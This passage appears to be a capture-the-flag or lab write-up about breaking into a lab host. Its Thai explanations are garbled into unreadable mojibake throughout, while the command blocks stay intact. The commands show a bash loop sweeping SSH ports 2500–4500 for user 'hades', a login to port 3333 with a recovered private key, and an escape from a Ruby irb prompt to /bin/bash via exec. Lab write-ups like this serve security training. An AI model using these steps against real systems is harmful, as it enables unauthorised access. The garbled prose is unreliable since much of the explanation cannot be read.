ЁЯУб р╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣М: р╣Др╕Фр╣Й banner `SSH-2.0-SSH_v2.0@force10networks.com` тЖТ р╣Ар╕Ыр╣Зр╕Щ р╕нр╕╕р╕Ыр╕Бр╕гр╕Ур╣Мр╣Ар╕Др╕гр╕╖р╕нр╕Вр╣Ир╕▓р╕в (Force10) р╣Др╕бр╣Ир╣Гр╕Кр╣И OpenSSH р╕Ыр╕Бр╕Хр╕┤
```bash
ssh hades@10.201.52.151 -p2501
ssh hades@10.201.52.151 -p2502
```

![ssh](images/11.png)

тЪая╕П р╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣М: `Connection reset by peer` тЖТ р╣Др╕бр╣Ир╕бр╕╡р╕Ър╕гр╕┤р╕Бр╕▓р╕г SSH р╕Ир╕гр╕┤р╕З

ЁЯУб 4) р╕кр╕Др╕гр╕┤р╕Ыр╕Хр╣Мр╕ер╕нр╕Зр╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕н SSH р╕Кр╣Ир╕зр╕З 2500тАУ4500

1. р╕кр╕гр╣Йр╕▓р╕Зр╕кр╕Др╕гр╕┤р╕Ыр╕Хр╣М `Secure-shell.sh` р╣Вр╕Фр╕вр╣Гр╕кр╣Ир╣Вр╕Др╣Йр╕Ф:
```bash
#!/bin/bash

for i in {2500..4500}
do
	ssh hades@10.201.52.151 -p$i
done
```
> (р╕кр╕Др╕гр╕┤р╕Ыр╕Хр╣Мр╕Ир╕░р╕Юр╕вр╕▓р╕вр╕▓р╕бр╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕н SSH р╕Бр╕▒р╕Ъ user hades р╕Ър╕Щр╕Юр╕нр╕гр╣Мр╕Хр╣Бр╕Хр╣Ир╕ер╕░р╕Хр╕▒р╕зр╣Гр╕Щр╕Кр╣Ир╕зр╕З 2500тАУ4500)

2. р╕гр╕▒р╕Щр╕кр╕Др╕гр╕┤р╕Ыр╕Хр╣М:
```bash
bash Secure-shell.sh
```

![3333](images/12.png)

3. р╕кр╕▒р╕Зр╣Ар╕Бр╕Хр╕Ьр╕ер╕ер╕▒р╕Юр╕Шр╣Мр╕Чр╕╡р╣Ир╕Ыр╕гр╕▓р╕Бр╕Пр╣Гр╕Щр╣Ар╕Чр╕нр╕гр╣Мр╕бр╕┤р╕Щр╕▒р╕е:
- р╕лр╕ер╕▓р╕вр╕Юр╕нр╕гр╣Мр╕Хр╕Хр╕нр╕Ър╕Бр╕ер╕▒р╕Ър╕Фр╣Йр╕зр╕в `Connection reset by peer` тЖТ р╕Эр╕▒р╣Ир╕Зр╣Ар╕Ыр╣Йр╕▓р╕лр╕бр╕▓р╕вр╕Ыр╕┤р╕Фр╕Бр╕▓р╕гр╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕нр╕Чр╕▒р╕Щр╕Чр╕╡ (service р╣Др╕бр╣Ир╕гр╕нр╕Зр╕гр╕▒р╕Ъ SSH р╕лр╕гр╕╖р╕нр╕Ыр╕Пр╕┤р╣Ар╕кр╕Шр╕Бр╕▓р╕гр╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕н)
- р╕Юр╕нр╕гр╣Мр╕Хр╕Ър╕▓р╕Зр╕Юр╕нр╕гр╣Мр╕Хр╣Бр╕кр╕Фр╕З banner р╣Ар╕Кр╣Ир╕Щ `SSH-2.0-SSH_v2.0@force10networks.com` тЖТ р╣Ар╕Ыр╣Зр╕Щр╕Ър╕гр╕┤р╕Бр╕▓р╕гр╕Вр╕нр╕Зр╕нр╕╕р╕Ыр╕Бр╕гр╕Ур╣Мр╣Ар╕Др╕гр╕╖р╕нр╕Вр╣Ир╕▓р╕в (р╣Др╕бр╣Ир╣Гр╕Кр╣И OpenSSH) р╕Фр╕▒р╕Зр╕Щр╕▒р╣Йр╕Щр╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕нр╕Фр╣Йр╕зр╕вр╣Др╕Др╕ер╣Ар╕нр╕Щр╕Хр╣М SSH р╕Шр╕гр╕гр╕бр╕Фр╕▓р╕нр╕▓р╕Ир╣Др╕бр╣Ир╕Чр╕│р╕Зр╕▓р╕Щ (invalid format)
- р╣Ар╕бр╕╖р╣Ир╕нр╕кр╕Др╕гр╕┤р╕Ыр╕Хр╣Мр╕Цр╕╢р╕Зр╕Юр╕нр╕гр╣Мр╕Х 3333 р╕Юр╕Ър╕зр╣Ир╕▓р╣Вр╕Ыр╕гр╣Вр╕Хр╕Др╕нр╕ер╕Хр╕нр╕Ър╕Бр╕ер╕▒р╕Ър╣Ар╕Ыр╣Зр╕Щ SSH р╕Ир╕гр╕┤р╕Зр╕Ир╕Щр╣Бр╕кр╕Фр╕З fingerprint р╣Бр╕ер╕░р╕Цр╕▓р╕б `Are you sure you want to continue connecting (yes/no/[fingerprint])?` тЖТ р╕Ър╣Ир╕Зр╕Кр╕╡р╣Йр╕зр╣Ир╕▓ р╕Юр╕нр╕гр╣Мр╕Х 3333 р╣Гр╕лр╣Йр╕Ър╕гр╕┤р╕Бр╕▓р╕г SSH (host key р╕Цр╕╣р╕Бр╕кр╣Ир╕Зр╕бр╕▓)

## ЁЯФУ 7. р╕Ир╕▓р╕Б irb тЖТ р╕лр╕ер╕╕р╕Фр╣Ар╕Ыр╣Зр╕Щ /bin/bash (Shell escape)
- р╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕нр╕Фр╣Йр╕зр╕в private key:
```bash
ssh -i id_rsa hades@10.201.52.151 -p 3333
```
р╣Ар╕бр╕╖р╣Ир╕нр╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕нр╕кр╕│р╣Ар╕гр╣Зр╕И р╣Др╕Фр╣Й prompt р╣Ар╕Ыр╣Зр╕Щ Ruby interactive shell (`irb(main):001:0>`)

### р╕Чр╕│р╣Др╕бр╕бр╕▒р╕Щр╣Ар╕Кр╕╖р╣Ир╕нр╕бр╕Хр╣Ир╕нр╕кр╕│р╣Ар╕гр╣Зр╕И (р╣Др╕бр╣Ир╕Хр╣Йр╕нр╕Зр╣Гр╕кр╣Ир╕гр╕лр╕▒р╕кр╕Ьр╣Ир╕▓р╕Щ)
1. Key-based authentication
- SSH р╣Гр╕Кр╣Йр╕Др╕╣р╣Ир╕Бр╕╕р╕Нр╣Бр╕И private key (р╣Ар╕гр╕▓р╕Цр╕╖р╕н: id_rsa) р╕Бр╕▒р╕Ъ public key (р╕нр╕вр╕╣р╣Ир╕Ър╕Щр╣Ар╕Др╕гр╕╖р╣Ир╕нр╕Зр╣Ар╕Ыр╣Йр╕▓р╕лр╕бр╕▓р╕вр╣Гр╕Щ ~hades/.ssh/authorized_keys) р╣Бр╕Чр╕Щр╕Бр╕▓р╕гр╣Гр╕кр╣Ир╕гр╕лр╕▒р╕кр╕Ьр╣Ир╕▓р╕Щ

2. р╕Вр╕▒р╣Йр╕Щр╕Хр╕нр╕Щр╕вр╣Ир╕нр╕Вр╕нр╕Зр╕Бр╕▓р╕гр╕Юр╕┤р╕кр╕╣р╕Ир╕Щр╣Мр╕Хр╕▒р╕зр╕Хр╕Щ
<pre>bash<br>ls -la<br></pre>

р╕Чр╕│р╕нр╕░р╣Др╕гр╕Хр╣Ир╕н
- р╣Ар╕Ыр╕┤р╕Фр╕лр╕Щр╣Йр╕▓ GTFOBins р╕Фр╕╣ entry р╕кр╕│р╕лр╕гр╕▒р╕Ъ irb (irb р╕кр╕▓р╕бр╕▓р╕гр╕Ц exec р╣Вр╕Ыр╕гр╣Бр╕Бр╕гр╕бр╕нр╕╖р╣Ир╕Щр╣Др╕Фр╣Й)
- р╣Гр╕Кр╣Йр╕Др╕│р╕кр╕▒р╣Ир╕Зр╕Ир╕▓р╕Б GTFOBins р╣Ар╕Юр╕╖р╣Ир╕н spawn bash:
```ruby
exec '/bin/bash'
```







